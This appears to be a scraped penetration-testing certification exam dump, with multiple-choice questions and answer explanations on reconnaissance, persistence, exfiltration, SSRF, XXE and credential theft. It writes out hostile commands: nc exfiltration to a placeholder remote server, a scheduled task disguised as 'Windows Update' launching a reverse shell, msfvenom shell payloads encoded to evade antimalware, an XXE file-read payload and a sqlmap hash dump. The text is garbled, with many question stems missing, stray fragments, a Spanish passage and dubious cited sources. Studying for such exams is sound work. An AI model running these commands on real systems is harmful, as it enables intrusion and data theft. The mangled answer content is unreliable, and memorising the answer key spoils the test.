A. Target 1: CVSS Score = 4 and EPSS Score = 0.6
B. Target 2: CVSS Score = 2 and EPSS Score = 0.3
C. Target 3: CVSS Score = 1 and EPSS Score = 0.6
D. Target 4: CVSS Score = 4.5 and EPSS Score = 0.4
Answer: ( SHOW ANSWER )
Based on the CVSS (Common Vulnerability Scoring System) and EPSS (Exploit Prediction
Scoring System) scores, Target 1 is the most likely to get attacked.
* CVSS:
* Definition: CVSS provides a numerical score to represent the severity of a vulnerability, helping
to prioritize the response based on the potential impact.
* Score Range: Scores range from 0 to 10, with higher scores indicating more severe
vulnerabilities.
* EPSS:
* Definition: EPSS estimates the likelihood that a vulnerability will be exploited in the wild within
the next 30 days.
* Score Range: EPSS scores range from 0 to 1, with higher scores indicating a higher likelihood
of exploitation.
* Analysis:

* Target 1: CVSS = 4, EPSS = 0.6
* Target 2: CVSS = 2, EPSS = 0.3
* Target 3: CVSS = 1, EPSS = 0.6
* Target 4: CVSS = 4.5, EPSS = 0.4
* Target 1 has a moderate CVSS score and a high EPSS score, indicating it has a significant
vulnerability that is quite likely to be exploited.
Pentest References:
* Vulnerability Prioritization: Using CVSS and EPSS scores to prioritize vulnerabilities based on
severity and likelihood of exploitation.
* Risk Assessment: Understanding the balance between impact (CVSS) and exploit likelihood
(EPSS) to identify the most critical targets for remediation or attack.
By focusing on Target 1, which has a balanced combination of severity and exploitability, the
penetration tester can address the most likely target for attacks based on the given scores.

NEW QUESTION: 4
A penetration tester is conducting reconnaissance on a target network. The tester runs the
following Nmap command: nmap -sv -sT -p - 192.168.1.0/24. Which of the following describes the
most likely purpose of this scan?
A. OS fingerprinting
B. Attack path mapping
C. Service discovery
D. User enumeration
Answer: ( SHOW ANSWER )
The Nmap command nmap -sv -sT -p- 192.168.1.0/24 is designed to discover services on a
network. Here is a breakdown of the command and its purpose:
* Command Breakdown:
* nmap: The network scanning tool.
* -sV: Enables service version detection. This option tells Nmap to determine the version of the
services running on open ports.
* -sT: Performs a TCP connect scan. This is a more reliable method of scanning as it completes
the TCP handshake but can be easily detected by firewalls and intrusion detection systems.
* -p-: Scans all 65535 ports. This ensures a comprehensive scan of all possible TCP ports.
* 192.168.1.0/24: Specifies the target network range (subnet) to be scanned.
* Purpose of the Scan:
* Service Discovery : The primary purpose of this scan is to discover which services are running
on the network's hosts and determine their versions. This information is crucial for identifying
potential vulnerabilities and understanding the network's exposure.

Lock picking techniques are used in physical security assessments to test access control
mechanisms.
* Raking (Option D):
* Raking is a lock-picking technique where a rake pick is inserted and rapidly moved in and out to
manipulate multiple pins simultaneously.
* It is faster but less precise than single-pin picking.
* Used when speed is prioritized over precision.

NEW QUESTION: 6
A penetration tester is developing the rules of engagement for a potential client. Which of the
following would most likely be a function of the rules of engagement?
A. Testing window
B. Terms of service
C. Authorization letter
D. Shared responsibilities
Answer: ( SHOW ANSWER )
The rules of engagement define the scope, limitations, and conditions under which a penetration
test is conducted. Here's why option A is correct:
* Testing Window: This specifies the time frame during which the penetration testing activities are
authorized to occur. It is a crucial part of the rules of engagement to ensure the testing does not
disrupt business operations and is conducted within agreed-upon hours.
* Terms of Service: This generally refers to the legal agreement between a service provider and
user, not specific to penetration testing engagements.
* Authorization Letter: This provides formal permission for the penetration tester to perform the
assessment but is not a component of the rules of engagement.
* Shared Responsibilities: This refers to the division of security responsibilities between parties,
often seen in cloud service agreements, but not specifically a function of the rules of engagement.
References from Pentest:
* Luke HTB: Highlights the importance of clearly defining the testing window in the rules of
engagement to ensure all parties are aligned.
* Forge HTB: Demonstrates the significance of having a well-defined testing window to avoid
disruptions and ensure compliance during the assessment.

NEW QUESTION: 8
During an assessment, a penetration tester gains access to one of the internal hosts. Given the
following command:
schtasks /create /sc onlogon /tn "Windows Update" /tr "cmd.exe /c reverse_shell.exe" Which of
the following is the penetration tester trying to do with this code?
A. Enumerate the scheduled tasks
B. Establish persistence
C. Deactivate the Windows Update functionality
D. Create a binary application for Windows System Updates
Answer: ( SHOW ANSWER )
The command creates a scheduled task that executes a reverse shell payload at logon, ensuring
persistence.
* Option A (Enumerate tasks) #: This command creates a task, not lists tasks (schtasks /query is
used for enumeration).
* Option B (Establish persistence) #: Correct.
* The attacker ensures a reverse shell opens every time a user logs in.
* Option C (Deactivate Windows Update) #: The task is named "Windows Update" but does not
disable updates.
* Option D (Create a Windows Update binary) #: This executes a reverse shell, not a system
update.

NEW QUESTION: 10
A. tar -zcvf /tmp/data.tar.gz /path/to/data && nc -w 3 <remote_server> 443 < /tmp/data.tar.gz
B. gzip /path/to/data && cp data.gz <remote_server> 443
C. gzip /path/to/data && nc -nvlk 443; cat data.gz ' nc -w 3 <remote_server> 22
D. tar -zcvf /tmp/data.tar.gz /path/to/data && scp /tmp/data.tar.gz <remote_server>
Answer: ( SHOW ANSWER )
Given the firewall policy, let's analyze the commands provided and determine which one is
suitable for exfiltrating data through the allowed network traffic. The firewall policy rules are:
* Block: Any traffic from 192.168.10.0/24 to 10.0.0.0/24 on port 22 (TCP).
* Allow: All traffic (0.0.0.0/0) to 192.168.10.0/24 on port 443 (TCP).
* Allow: Traffic from 192.168.10.0/24 to anywhere on port 443 (TCP).
* Block: All other traffic (*).
Breakdown of Options:
* Option A: tar -zcvf /tmp/data.tar.gz /path/to/data && nc -w 3 <remote_server> 443
< /tmp/data.tar.gz
* This command compresses the data into a tar.gz file and uses nc (netcat) to send it to a remote
server on port 443.
* Since the firewall allows outbound connections on port 443 (both within and outside the subnet
192.168.10.0/24), this command adheres to the policy and is the correct choice.
* Option B: gzip /path/to/data && cp data.gz <remote_server> 443
* This command compresses the data but attempts to copy it directly to a server, which is not a
valid command. The cp command does not support network operations in this manner.
* Option C: gzip /path/to/data && nc -nvlk 443; cat data.gz | nc -w 3 <remote_server> 22

* This command attempts to listen on port 443 and then send data over port 22. However,
outbound connections to port 22 are blocked by the firewall, making this command invalid.
* Option D: tar -zcvf /tmp/data.tar.gz /path/to/data && scp /tmp/data.tar.gz <remote_server>
* This command uses scp to copy the file, which typically uses port 22 for SSH. Since the firewall
blocks port 22, this command will not work.
References from Pentest:
* Gobox HTB: The Gobox write-up emphasizes the use of proper enumeration and leveraging
allowed services for exfiltration. Specifically, using tools like nc for data transfer over allowed
ports, similar to the method in Option A.
* Forge HTB: This write-up also illustrates how to handle firewall restrictions by exfiltrating data
through allowed ports and protocols, emphasizing understanding firewall rules and using
appropriate commands like curl and nc.
* Horizontall HTB: Highlights the importance of using allowed services and ports for data
exfiltration.
The approach taken in Option A aligns with the techniques used in these practical scenarios
where nc is used over an allowed port.
NEW QUESTION: 11
A penetration tester compromises a Windows OS endpoint that is joined to an Active Directory
local environment. Which of the following tools should the tester use to manipulate authentication
mechanisms to move laterally in the network?
A. Rubeus
B. WinPEAS
C. NTLMRelayX
D. Impacket
Answer: ( SHOW ANSWER )
Rubeus is a post-exploitation tool used for Kerberos abuse, including ticket extraction, pass-the-
ticket, ticket renewal, and Kerberoasting. It's ideal for lateral movement within Active Directory
environments.
* WinPEAS is mainly used for local privilege escalation and enumeration.
* NTLMRelayX (from Impacket) is useful for relaying NTLM authentication but is not focused on
Kerberos.
* Impacket is a collection of tools; Rubeus is more targeted for Kerberos attacks.
NEW QUESTION: 12
During the reconnaissance phase, a penetration tester collected the following information from
the DNS records:
A-----> www
A-----> host
TXT --> vpn.comptia.org
SPF---> ip =2.2.2.2

Which of the following DNS records should be in place to avoid phishing attacks using spoofing
domain techniques?
A. MX
B. SOA
C. DMARC
D. CNAME
Answer: C ( LEAVE A REPLY )
DMARC (Domain-based Message Authentication, Reporting & Conformance) is an email
authentication protocol that helps prevent email spoofing and phishing. It builds on SPF (Sender
Policy Framework) and DKIM (DomainKeys Identified Mail) to provide a mechanism for email
senders and receivers to improve and monitor the protection of the domain from fraudulent email.
* Understanding DMARC:
* SPF: Defines which IP addresses are allowed to send emails on behalf of a domain.
* DKIM: Provides a way to check that an email claiming to come from a specific domain was
indeed authorized by the owner of that domain.
* DMARC: Uses SPF and DKIM to determine the authenticity of an email and specifies what
action to take if the email fails the authentication checks.
* Implementing DMARC:
* Create a DMARC policy in your DNS records. This policy can specify to reject, quarantine, or
take no action on emails that fail SPF or DKIM checks.
* Example DMARC record: v=DMARC1; p=reject; rua=mailto: dmarc-reports@yourdomain.com ;
* Benefits of DMARC:
* Helps to prevent email spoofing and phishing attacks.
* Provides visibility into email sources through reports.
* Enhances domain reputation by ensuring only legitimate emails are sent from the domain.
* DMARC Record Components:
* v: Version of DMARC.
* p: Policy for handling emails that fail the DMARC check (none, quarantine, reject).
* rua: Reporting URI of aggregate reports.
* ruf: Reporting URI of forensic reports.
* pct: Percentage of messages subjected to filtering.
* Real-World Example:
* A company sets up a DMARC policy with p=reject to ensure that any emails failing SPF or DKIM
checks are rejected outright, significantly reducing the risk of phishing attacks using their domain.
* References from Pentesting Literature:
* In "Penetration Testing - A Hands-on Introduction to Hacking," DMARC is mentioned as part of
email security protocols to prevent phishing.
* HTB write-ups often highlight the importance of DMARC in securing email communications and
preventing spoofing attacks.

* It allows controlled adversary simulations without real exploitation.
NEW QUESTION: 14
A penetration tester finishes a security scan and uncovers numerous vulnerabilities on several
hosts. Based on the targets' EPSS (Exploit Prediction Scoring System) and CVSS (Common
Vulnerability Scoring System) scores, which of the following targets is the most likely to get
attacked?
A. Target 1: EPSS Score = 0.6, CVSS Score = 4
B. Target 2: EPSS Score = 0.3, CVSS Score = 2
C. Target 3: EPSS Score = 0.6, CVSS Score = 1
D. Target 4: EPSS Score = 0.4, CVSS Score = 4.5
Answer: ( SHOW ANSWER )
The EPSS (Exploit Prediction Scoring System) estimates how likely a vulnerability is to be
exploited. Higher EPSS scores indicate a higher likelihood of exploitation.
* Option A (Target 1) #:
* EPSS 0.6 (60% chance of exploitation)
* CVSS 4 (Medium severity)
* # Best candidate since it has the highest likelihood of exploitation.
* Option B (Target 2) #: EPSS 0.3 (30%) is lower, making it less likely to be attacked.
* Option C (Target 3) #: EPSS 0.6 is high, but CVSS 1 is very low, meaning the vulnerability is not
critical.
* Option D (Target 4) #: CVSS 4.5 is higher, but EPSS 0.4 is lower, meaning attackers are less
likely to exploit it.

NEW QUESTION: 15
Which of the following post-exploitation activities allows a penetration tester to maintain persistent
access in a compromised system?
A. Creating registry keys
B. Installing a bind shell
C. Executing a process injection
D. Setting up a reverse SSH connection
Answer: ( SHOW ANSWER )
Maintaining persistent access in a compromised system is a crucial goal for a penetration tester
after achieving initial access. Here's an explanation of each option and why creating registry keys
is the preferred method:
* Creating registry keys:
* Explanation: Modifying or adding specific registry keys can ensure that malicious code or
backdoors are executed every time the system starts, thus maintaining persistence.
* Advantages: This method is stealthy and can be effective in maintaining access over long
periods, especially on Windows systems.
* Example: Adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run
registry key to execute a malicious script upon system boot.

A. msfvenom --arch x86-64 --platform windows --encoder x86-64/shikata_ga_nai --payload
windows
/bind_tcp LPORT=443
B. msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=8000
C. msfvenom --arch x86-64 --platform windows --payload windows/shell_reverse_tcp LHOST=10.
10.10.100 LPORT=4444 EXITFUNC=none
D. net user add /administrator | hexdump > payload
Answer: ( SHOW ANSWER )
* Using shikata_ga_nai:
* This encoder obfuscates the payload, making it harder for antimalware to detect.
* The command specifies a bind shell (windows/bind_tcp) payload, targeting Windows with
architecture x86-64.
* Why Not Other Options?
* B, C: These commands generate payloads but do not use an encoder, increasing the likelihood
of detection by antimalware.
* D: This command is unrelated to generating shellcode; it appears to be an attempt to
manipulate accounts.

NEW QUESTION: 17
A penetration testing team wants to conduct DNS lookups for a set of targets provided by the
client. The team crafts a Bash script for this task. However, they find a minor error in one line of
the script:
1 #!/bin/bash
2 for i in $(cat example.txt); do
3 curl $i
4 done
Which of the following changes should the team make to line 3 of the script?
A. resolvconf $i
B. rndc $i
C. systemd-resolve $i
D. host $i
Answer: ( SHOW ANSWER )
* Script Analysis:
* Line 1: #!/bin/bash - This line specifies the script should be executed in the Bash shell.
* Line 2: for i in $(cat example.txt); do - This line starts a loop that reads each line from the file
example.txt and assigns it to the variable i.
* Line 3: curl $i - This line attempts to fetch the content from the URL stored in i using curl.
However, for DNS lookups, curl is inappropriate.
* Line 4: done - This line ends the loop.
* Error Identification:
* The curl command is used for transferring data from or to a server, often used for HTTP
requests, which is not suitable for DNS lookups.
* Correct Command:
* To perform DNS lookups, the host command should be used. The host command performs DNS
lookups and displays information about the given domain.
* Corrected Script:
* Replace curl $i with host $i to perform DNS lookups on each target specified in example.txt.
Pentest References:

* In penetration testing, DNS enumeration is a crucial step. It involves querying DNS servers to
gather information about the target domain, which includes resolving domain names to IP
addresses and vice versa.
* Common tools for DNS enumeration include host, dig, and nslookup. The host command is
particularly straightforward for simple DNS lookups.
By correcting the script to use host $i, the penetration testing team can effectively perform DNS
lookups on the targets specified in example.txt.
NEW QUESTION: 18
A penetration tester is performing an authorized physical assessment. During the test, the tester
observes an access control vestibule and on-site security guards near the entry door in the lobby.
Which of the following is the best attack plan for the tester to use in order to gain access to the
facility?
A. Clone badge information in public areas of the facility to gain access to restricted areas.
B. Tailgate into the facility during a very busy time to gain initial access.
C. Pick the lock on the rear entrance to gain access to the facility and try to gain access.
D. Drop USB devices with malware outside of the facility in order to gain access to internal
machines.
Answer: ( SHOW ANSWER )
In an authorized physical assessment, the goal is to test physical security controls. Tailgating is a
common and effective technique in such scenarios. Here's why option B is correct:
* Tailgating: This involves following an authorized person into a secure area without proper
credentials.
During busy times, it's easier to blend in and gain access without being noticed. It tests the
effectiveness of physical access controls and security personnel.
* Cloning Badge Information: This can be effective but requires proximity to employees and
specialized equipment, making it more complex and time-consuming.
* Picking Locks: This is a more invasive technique that carries higher risk and is less stealthy
compared to tailgating.
* Dropping USB Devices: This tests employee awareness and response to malicious devices but
does not directly test physical access controls.
References from Pentest:
* Writeup HTB: Demonstrates the effectiveness of social engineering and tailgating techniques in
bypassing physical security measures.
* Forge HTB: Highlights the use of non-invasive methods like tailgating to test physical security
without causing damage or raising alarms.
Conclusion:
Option B, tailgating into the facility during a busy time, is the best attack plan to gain access to the
facility in an authorized physical assessment.

NEW QUESTION: 20
A. IAM credentials
B. SSH key for cloud instance
C. Cloud storage credentials
D. Temporary security credentials (STS)
Answer: A ( LEAVE A REPLY )
IAM (Identity and Access Management) credentials are used to control and manage access to
cloud services and resources. When a penetration tester obtains IAM credentials, especially
those with administrative privileges, they can perform high-level operations such as provisioning
services, modifying configurations, or accessing sensitive data across the cloud environment.
* SSH keys would only grant access to a specific instance, not cloud-wide services.
* Cloud storage credentials are limited to storage access, not administrative capabilities.
* Temporary security credentials (STS) provide limited-time access and are not typically used for
broad administrative tasks.
NEW QUESTION: 21

NEW QUESTION: 22
A client warns the assessment team that an ICS application is maintained by the manufacturer.
Any tampering of the host could void the enterprise support terms of use.
Which of the following techniques would be most effective to validate whether the application
encrypts communications in transit?
A. Utilizing port mirroring on a firewall appliance
B. Installing packet capture software on the server
C. Reconfiguring the application to use a proxy
D. Requesting that certificate pinning be disabled
Answer: ( SHOW ANSWER )
Since direct interaction with the ICS application is restricted, the best way to analyze network
traffic without modifying the system is to use port mirroring on a firewall or network switch.
* Option A (Port mirroring) #:
* Correct. Port mirroring (SPAN) copies network traffic without modifying the host system.
* Allows passive analysis of whether encryption is used.
* Option B (Packet capture on the server) #:
* Requires modifying the host, which is prohibited by the client.
* Option C (Reconfiguring the app to use a proxy) #:
* Modifies application settings, which violates the client's terms.
* Option D (Disabling certificate pinning) #:
* Requires changes to security settings, which is not allowed in this scenario.

Which of the following is the most efficient way to exfiltrate a file containing data that could be
sensitive?
A. Use steganography and send the file over FTP.
B. Compress the file and send it using TFTP.
C. Split the file in tiny pieces and send it over dnscat.
D. Encrypt and send the file over HTTPS.
Answer: ( SHOW ANSWER )
Enviar un archivo cifrado por HTTPS es el metodo mas eficiente, seguro y menos sospechoso
para exfiltrar datos. HTTPS cifra el contenido y es un protocolo comun que no genera tantas
alertas en los sistemas de monitoreo.

Otras opciones como dnscat son mas sigilosas pero menos eficientes y requieren control sobre
la infraestructura. Steganografia o TFTP pueden ser utiles, pero FTP/TFTP son inseguros y poco
usados actualmente, lo cual los hace mas sospechosos.

NEW QUESTION: 27
During a security assessment for an internal corporate network, a penetration tester wants to gain
unauthorized access to internal resources by executing an attack that uses software to disguise
itself as legitimate software. Which of the following host-based attacks should the tester use?
A. On-path
B. Logic bomb
C. Rootkit
D. Buffer overflow
Answer: ( SHOW ANSWER )
A rootkit is a type of malicious software designed to provide an attacker with unauthorized access
to a computer system while concealing its presence. Rootkits achieve this by modifying the host's
operating system or other software to hide their existence, allowing the attacker to maintain
control over the system without detection.
* Definition and Purpose:
* Rootkits are primarily used to gain and maintain root access (administrative privileges) on a
system.
* They disguise themselves as legitimate software or integrate deeply into the operating system to
avoid detection.
* Mechanisms of Action:

* Kernel Mode Rootkits: These operate at the kernel level, which is the core of the operating
system, making them very powerful and hard to detect.
* User Mode Rootkits: These run in the same space as user applications, intercepting and altering
standard system API calls to hide their presence.
* Bootkits: These infect the Master Boot Record (MBR) or Volume Boot Record (VBR) and load
before the operating system, making them extremely difficult to detect and remove.
* Detection and Prevention:
* Detection Tools: Tools like RootkitRevealer, Chkrootkit, and rkhunter can help in identifying
rootkits.
* Prevention: Regular system updates, use of strong antivirus and anti-malware solutions, and
integrity checking tools like Tripwire can help in preventing rootkit infections.
* Real-World Examples:
* Sony BMG Rootkit: In 2005, Sony BMG included a rootkit in their digital rights management
(DRM) software on music CDs. The rootkit hid files and processes, leading to a major scandal
when it was discovered.
* Stuxnet: This sophisticated worm included a rootkit component to hide its presence on infected
systems, making it one of the most infamous examples of rootkit use in a cyber attack.
* References from Pentesting Literature:
* In "Penetration Testing - A Hands-on Introduction to Hacking" by Georgia Weidman, rootkits are
discussed in the context of post-exploitation, where maintaining access to the compromised
system is crucial.
* Various HTB write-ups, such as the analysis of complex attacks involving multiple stages of
exploitation, often highlight the use of rootkits in maintaining persistent access.

NEW QUESTION: 29
As part of a security audit, a penetration tester finds an internal application that accepts
unexpected user inputs, leading to the execution of arbitrary commands. Which of the following
techniques would the penetration tester most likely use to access the sensitive data?
A. Logic bomb
B. SQL injection
C. Brute-force attack
D. Cross-site scripting
Answer: ( SHOW ANSWER )
SQL injection (SQLi) is a technique that allows attackers to manipulate SQL queries to execute
arbitrary commands on a database. It is one of the most common and effective methods for
accessing sensitive data in internal applications that accept unexpected user inputs. Here's why
option B is the most likely technique:
* Arbitrary Command Execution: The question specifies that the internal application accepts
unexpected user inputs leading to arbitrary command execution. SQL injection fits this description
as it exploits vulnerabilities in the application's input handling to execute unintended SQL
commands on the database.
* Data Access: SQL injection can be used to extract sensitive data from the database, modify or
delete records, and perform administrative operations on the database server. This makes it a
powerful technique for accessing sensitive information.
* Common Vulnerability: SQL injection is a well-known and frequently exploited vulnerability in
web applications, making it a likely technique that a penetration tester would use to exploit input
handling issues in an internal application.
References from Pentest:
* Luke HTB: This write-up demonstrates how SQL injection was used to exploit an internal
application and access sensitive data. It highlights the process of identifying and leveraging SQL
injection vulnerabilities to achieve data extraction.
* Writeup HTB: Describes how SQL injection was utilized to gain access to user credentials and
further exploit the application. This example aligns with the scenario of using SQL injection to
execute arbitrary commands and access sensitive data.
Conclusion:
Given the nature of the vulnerability described (accepting unexpected user inputs leading to
arbitrary command execution), SQL injection is the most appropriate and likely technique that the
penetration tester would use to access sensitive data. This method directly targets the input
handling mechanism to manipulate SQL queries, making it the best choice.

* BloodHound is used for mapping out Active Directory relationships and identifying potential
attack paths but not for using NTLM hashes directly.
* Option D: CrackMapExec
* CrackMapExec is a versatile tool that can perform pass-the-hash attacks, execute commands,
and more using NTLM hashes. It is designed for post-exploitation scenarios involving NTLM
hashes.
References from Pentest:
* Forge HTB: Demonstrates the use of CrackMapExec for leveraging NTLM hashes to gain
further access within a network.
* Horizontall HTB: Shows how CrackMapExec can be used for various post-exploitation activities,
including using NTLM hashes to authenticate and execute commands.
Conclusion:
Option D, CrackMapExec, is the most suitable tool for continuing the attack using an NTLM hash.
It supports pass-the-hash techniques and other operations that can leverage NTLM hashes

NEW QUESTION: 34
A penetration tester identifies an exposed corporate directory containing first and last names and
phone numbers for employees. Which of the following attack techniques would be the most
effective to pursue if the penetration tester wants to compromise user accounts?
A. Smishing
B. Impersonation
C. Tailgating
D. Whaling
Answer: ( SHOW ANSWER )

When a penetration tester identifies an exposed corporate directory containing first and last
names and phone numbers, the most effective attack technique to pursue would be smishing.
Here's why:
* Understanding Smishing:
* Smishing (SMS phishing) involves sending fraudulent messages via SMS to trick individuals into
revealing personal information or performing actions that compromise security. Since the tester
has access to phone numbers, this method is directly applicable.
* Why Smishing is Effective:
* Personalization: Knowing the first and last names allows the attacker to personalize the
messages, making them appear more legitimate and increasing the likelihood of the target
responding.
* Immediate Access: People tend to trust and respond quickly to SMS messages compared to
emails, especially if the messages appear urgent or important.
* Alternative Attack Techniques:
* Impersonation: While effective, it generally requires real-time interaction and may not scale well
across many targets.
* Tailgating: This physical social engineering technique involves following someone into a
restricted area and is not feasible with just names and phone numbers.
* Whaling: This targets high-level executives with highly personalized phishing attacks. Although
effective, it is more specific and may not be suitable for the broader set of employees in the
directory.
NEW QUESTION: 35
A penetration tester has found a web application that is running on a cloud virtual machine
instance.
Vulnerability scans show a potential SSRF for the same application URL path with an injectable
parameter.
Which of the following commands should the tester run to successfully test for secrets exposure
exploitability?
A. curl <url>?param=http://169.254.169.254/latest/meta-data/
B. curl '<url>?param=http://127.0.0.1/etc/passwd'
C. curl '<url>?param=<script>alert(1)<script>/'
D. curl <url>?param=http://127.0.0.1/
Answer: ( SHOW ANSWER )
In a cloud environment, testing for Server-Side Request Forgery (SSRF) vulnerabilities involves
attempting to access metadata services. Here's why the specified command is appropriate:
* Accessing Cloud Metadata Service:
* URL:
http://169.254.169.254/latest/meta-data/ is a well-known endpoint in cloud environments (e.g.,
AWS) to access instance metadata.

* Purpose: By exploiting SSRF to access this URL, an attacker can retrieve sensitive information
such as instance credentials and other metadata.
* Comparison with Other Commands:
* 127.0.0.1/etc/passwd: This is more about local file inclusion, not specific to cloud metadata.
* <script>alert(1)</script>: This tests for XSS, not SSRF.
* 127.0.0.1: This is a generic loopback address and does not specifically test for metadata access
in a cloud environment.
Using curl <url>?param=http://169.254.169.254/latest/meta-data/
is the correct approach to test for SSRF vulnerabilities in cloud environments to potentially
expose secrets.

NEW QUESTION: 41
During a security assessment, a penetration tester uses a tool to capture plaintext log-in
credentials on the communication between a user and an authentication system. The tester wants
to use this information for further unauthorized access. Which of the following tools is the tester
using?
A. Burp Suite
B. Wireshark
C. Zed Attack Proxy
D. Metasploit
Answer: ( SHOW ANSWER )

Wireshark is a network packet analyzer used to capture and analyze network traffic in real-time.
During a penetration test, it is often used to inspect unencrypted communication to extract
sensitive information like plaintext login credentials. Here's how it works:
* Packet Capturing:Wireshark captures the network packets transmitted over a network interface.
If a user logs in through an insecure communication protocol (e.g., HTTP, FTP, or Telnet), the
credentials are transmitted in plaintext.
* Traffic Filtering:Using filters (e.g., http, tcp.port == 21), the tester narrows down the relevant
traffic to locate the login request and response packets.
* Sensitive Data Extraction:Analyzing the captured packets reveals plaintext credentials in the
data payload, such as in HTTP POST requests.
* Exploit the Information:After extracting the plaintext credentials, the tester can attempt
unauthorized access to resources using these credentials.

NEW QUESTION: 48
During an assessment, a penetration tester obtains a low-privilege shell and then runs the
following command:
findstr /SIM /C:"pass" *.txt *.cfg *.xml
Which of the following is the penetration tester trying to enumerate?
A. Configuration files
B. Permissions
C. Virtual hosts
D. Secrets
Answer: ( SHOW ANSWER )
By running the command findstr /SIM /C:"pass" *.txt *.cfg *.xml, the penetration tester is trying to
enumerate secrets.
* Command Analysis:
* findstr: A command-line utility in Windows used to search for specific strings in files.
* /SIM: Combination of options; /S searches for matching files in the current directory and all
subdirectories, /I specifies a case-insensitive search, and /M prints only the filenames with
matching content.
* /C:"pass": Searches for the literal string "pass".
* ***.txt .cfg .xml: Specifies the file types to search within.
* Objective:
* The command is searching for the string "pass" within .txt, .cfg, and .xml files, which is indicative
of searching for passwords or other sensitive information (secrets).
* These file types commonly contain configuration details, credentials, and other sensitive data
that might include passwords or secrets.
* Other Options:

* Configuration files: While .cfg and .xml files can be configuration files, the specific search for
"pass" indicates looking for secrets like passwords.
* Permissions: This command does not check or enumerate file permissions.
* Virtual hosts: This command is not related to enumerating virtual hosts.
Pentest References:
* Post-Exploitation: Enumerating sensitive information like passwords is a common post-
exploitation activity after gaining initial access.
* Credential Discovery: Searching for stored credentials within configuration files and documents
to escalate privileges or move laterally within the network.
By running this command, the penetration tester aims to find stored passwords or other secrets
that could help in further exploitation of the target system.

NEW QUESTION: 52
During an assessment, a penetration tester exploits an SQLi vulnerability. Which of the following
commands would allow the penetration tester to enumerate password hashes?
A. sqlmap -u www.example.com/?id=1 --search -T user
B. sqlmap -u www.example.com/?id=1 --dump -D accounts -T users -C cred
C. sqlmap -u www.example.com/?id=1 --tables -D accounts
D. sqlmap -u www.example.com/?id=1 --schema --current-user --current-db
Answer: B ( LEAVE A REPLY )
To enumerate password hashes using an SQL injection vulnerability, the penetration tester needs
to extract specific columns from the database that typically contain password hashes. The --dump
command in sqlmap is used to dump the contents of the specified database table. Here's a
breakdown of the options:
* Option A: sqlmap -u www.example.com/?id=1 --search -T user
* The --search option is used to search for columns and not to dump data. This would not
enumerate password hashes.
* Option B: sqlmap -u www.example.com/?id=1 --dump -D accounts -T users -C cred

* This command uses --dump to extract data from the specified database accounts, table users,
and column cred. This is the correct option to enumerate password hashes, assuming cred is the
column containing the password hashes.
* Option C: sqlmap -u www.example.com/?id=1 --tables -D accounts
* The --tables option lists all tables in the specified database but does not extract data.
* Option D: sqlmap -u www.example.com/?id=1 --schema --current-user --current-db
* The --schema option provides the database schema information, and --current-user and --
current- db provide information about the current user and database but do not dump data.
References from Pentest:
* Writeup HTB: Demonstrates using sqlmap to dump data from specific tables to retrieve sensitive
information, including password hashes.
* Luke HTB: Shows the process of exploiting SQL injection to extract user credentials and hashes

NEW QUESTION: 53
A penetration tester reviews a SAST vulnerability scan report. The following vulnerability has
been reported as high severity:
Source file: components.ts
Issue 2 of 12: Command injection
Severity: High
Call: .innerHTML = response
The tester inspects the source file and finds the variable response is defined as a constant and is
not referred to or used in other sections of the code. Which of the following describes how the
tester should classify this reported vulnerability?
A. False negative
B. False positive
C. True positive
D. Low severity
Answer: ( SHOW ANSWER )
A false positive occurs when a vulnerability scan incorrectly flags a security issue that does not
exist or is not exploitable in the context of the application. Here's the reasoning:
* Definition of Command Injection:Command injection vulnerabilities occur when user-controllable
data is passed to an interpreter or command execution context without proper sanitization,
allowing an attacker to execute arbitrary commands.
* Code Analysis:
* The response variable is defined as a constant (const), which implies its value is immutable
during runtime.
* The response is not sourced from user input nor used elsewhere, meaning there is no attack
surface or exploitation pathway for an attacker to influence the content of response.
* Scanner Misclassification:Static Application Security Testing (SAST) tools may flag
vulnerabilities based on patterns (e.g., .innerHTML usage) without assessing the source and flow

of data, resulting in false positives.
* Final Classification:Since the response variable is static and unchangeable, the flagged issue is
not exploitable. This makes it a false positive.

A penetration tester finds that an application responds with the contents of the /etc/passwd file
when the following payload is sent:
<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY foo SYSTEM "file:///etc/passwd"> ]><test>&foo;</test>
Which of the following should the tester recommend in the report to best prevent this type of
vulnerability?
A. Drop all excessive file permissions with chmod o-rwx
B. Ensure the requests application access logs are reviewed frequently
C. Disable the use of external entities
D. Implement a WAF to filter all incoming requests
Answer: ( SHOW ANSWER )
This is an XML External Entity (XXE) attack, which occurs when an application processes XML
input that allows external entity references. The best mitigation is to disable external entities in the
XML parser.
* Option A (Change file permissions) #: Changing file permissions does not fix the root cause, as
the vulnerability is in XML processing.
* Option B (Review logs) #: Logs help with detection, but do not prevent XXE attacks.
* Option C (Disable external entities) #: Correct.
* Disabling external entity resolution in the XML parser prevents XXE attacks.
* Option D (WAF) #: A WAF can help block attacks, but disabling external entities is the best
solution.

Which of the following targets should the tester select next?

A. fileserver
B. hrdatabase
C. legaldatabase
D. financesite
Answer: ( SHOW ANSWER )
Given the output, the penetration tester should select the fileserver as the next target for testing,
considering both CVSS and EPSS scores.
* CVSS (Common Vulnerability Scoring System):
* Purpose: CVSS provides a numerical score to represent the severity of vulnerabilities, helping to
prioritize remediation efforts.
* Higher Scores: Indicate more severe vulnerabilities.
* EPSS (Exploit Prediction Scoring System):
* Purpose: EPSS estimates the likelihood that a vulnerability will be exploited in the wild within the
next 30 days.
* Higher Scores: Indicate a higher likelihood of exploitation.
* Evaluation:
* hrdatabase: CVSS = 9.9, EPSS = 0.50
* financesite: CVSS = 8.0, EPSS = 0.01
* legaldatabase: CVSS = 8.2, EPSS = 0.60
* fileserver: CVSS = 7.6, EPSS = 0.90
* The fileserver has the highest EPSS score, indicating a high likelihood of exploitation, despite
having a slightly lower CVSS score compared to hrdatabase and legaldatabase.
Pentest References:
* Prioritization: Balancing between severity (CVSS) and exploitability (EPSS) is crucial for
effective vulnerability management.
* Risk Assessment: Evaluating both the impact and the likelihood of exploitation helps in making
informed decisions about testing priorities.
By selecting the fileserver, which has a high EPSS score, the penetration tester focuses on a
target that is more likely to be exploited, thereby addressing the most immediate risk.

A tester compromises a target host and then wants to maintain persistent access. Which of the
following is the best way for the attacker to accomplish the objective?
A. Configure and register a service.
B. Install and run remote desktop software.
C. Set up a script to be run when users log in.
D. Perform a kerberoasting attack on the host.
Answer: A ( LEAVE A REPLY )
* Configuring and Registering a Service:
* Registering a malicious service ensures that it starts automatically with the system, providing
persistence even after reboots.

